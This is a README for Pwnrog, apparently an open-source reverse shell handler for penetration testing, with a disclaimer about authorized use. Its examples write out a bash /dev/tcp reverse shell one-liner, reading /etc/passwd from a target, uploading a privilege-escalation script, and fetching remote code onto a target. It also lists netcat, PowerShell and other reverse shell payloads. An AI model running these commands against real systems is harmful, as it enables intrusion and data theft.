# 🐸 Pwnrog

A powerful, feature-rich reverse shell handler with an interactive console, multi-port listeners, session management, and automatic PTY upgrade.

![Python](https://img.shields.io/badge/python-3.x-blue.svg)
![License](https://img.shields.io/badge/license-MIT-green.svg)

## Features

- 🎯 **Multi-port Listeners** - Listen on multiple ports simultaneously
- 🔄 **Session Management** - Handle multiple reverse shell connections
- 🖥️ **Auto PTY Upgrade** - Automatic upgrade to full interactive TTY
- 📁 **File Transfer** - Download/upload files with base64 or HTTP fallback
- 🌐 **URL Upload** - Download files from URLs directly to target
- 🎲 **Payload Generator** - Generate reverse shell payloads for Linux/Windows
- 📋 **Clipboard Integration** - Auto-copy generated payloads to clipboard
- ⌨️ **Tab Completion** - Full readline support with command completion

## Installation

```bash
git clone https://github.com/yourusername/pwnrog.git
cd pwnrog
chmod +x pwnrog.py
```

### Dependencies

- Python 3.x
- `xclip` (optional, for clipboard support)

```bash
# Ubuntu/Debian
sudo apt install xclip

# Arch
sudo pacman -S xclip
```

## Usage

### Basic Usage

```bash
# Start with default settings (0.0.0.0:1337)
./pwnrog.py

# Custom host and port
./pwnrog.py -lh 10.10.10.1 -lp 4444

# Multiple ports
./pwnrog.py -lp 1337,4444,9001
```

### CLI Payload Generation

```bash
# Generate random payload
./pwnrog.py -p

# Generate Linux bash payload
./pwnrog.py -p -os linux -pt bash

# Generate Windows PowerShell payload
./pwnrog.py -p -lh 10.10.10.1 -lp 4444 -os windows -pt powershell

# List all payload types
./pwnrog.py -pl
```

## Interactive Commands

### Main Commands

| Command | Description |
|---------|-------------|
| `help` | Show help message |
| `sessions` | List all connected sessions |
| `session <id>` | Interact with a specific session |
| `shell` | Enter interactive shell |
| `upgrade` | Upgrade session to full PTY |
| `download <remote> <local>` | Download file from target |
| `upload <local\|url> <remote>` | Upload file or download from URL to target |
| `background` / `bg` | Background current session |
| `ls [path]` | List local directory |
| `pwd` | Print local working directory |

### Payload Generation

| Command | Description |
|---------|-------------|
| `payload` | Generate random payload |
| `payload os=<linux\|windows>` | Generate for specific OS |
| `payload type=<type>` | Generate specific payload type |
| `payloads` | List available payload types |

### Configuration

| Command | Description |
|---------|-------------|
| `set lhost <ip\|interface>` | Set listener IP or interface |
| `set lport <port1,port2,...>` | Set listener ports |
| `listeners` | List all listeners |

### Control

| Command | Description |
|---------|-------------|
| `kill listener <id>` | Kill a specific listener |
| `kill session <id>` | Kill a specific session |
| `killall` | Kill all listeners and sessions (with confirmation) |
| `killall listener` | Kill all listeners |
| `killall session` | Kill all sessions |
| `exit` / `quit` | Exit pwnrog |

## Available Payload Types

### Linux
- `bash` - Bash TCP reverse shell
- `bash2` - Alternative bash reverse shell
- `python` - Python reverse shell
- `python3` - Python3 reverse shell
- `nc` - Netcat with -e flag
- `nc_mkfifo` - Netcat with mkfifo (OpenBSD compatible)
- `php` - PHP reverse shell
- `perl` - Perl reverse shell
- `ruby` - Ruby reverse shell

### Windows
- `powershell` - PowerShell reverse shell
- `powershell_b64` - Base64 encoded PowerShell
- `nc` - Netcat for Windows
- `python` - Python reverse shell

## Examples

### Connect and Interact

```bash
# Start listener
./pwnrog.py -lh eth0 -lp 4444

# On target machine
bash -i >& /dev/tcp/10.10.10.1/4444 0>&1

# In pwnrog console
pwnrog > sessions           # List sessions
pwnrog > session 1          # Select session
pwnrog [1] > upgrade        # Upgrade to PTY
pwnrog [1] > shell          # Enter interactive shell
```

### File Operations

```bash
# Download file from target
pwnrog [1] > download /etc/passwd ./passwd

# Upload local file
pwnrog [1] > upload ./linpeas.sh /tmp/linpeas.sh

# Download from URL to target
pwnrog [1] > upload https://raw.githubusercontent.com/user/repo/main/script.sh /tmp/script.sh
```

### Generate Payloads

```bash
pwnrog > payload os=linux type=bash
# Payload copied to clipboard

pwnrog > payloads
# Lists all available payload types
```

## License

MIT License

## Disclaimer

This tool is intended for authorized security testing and educational purposes only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before using this tool.
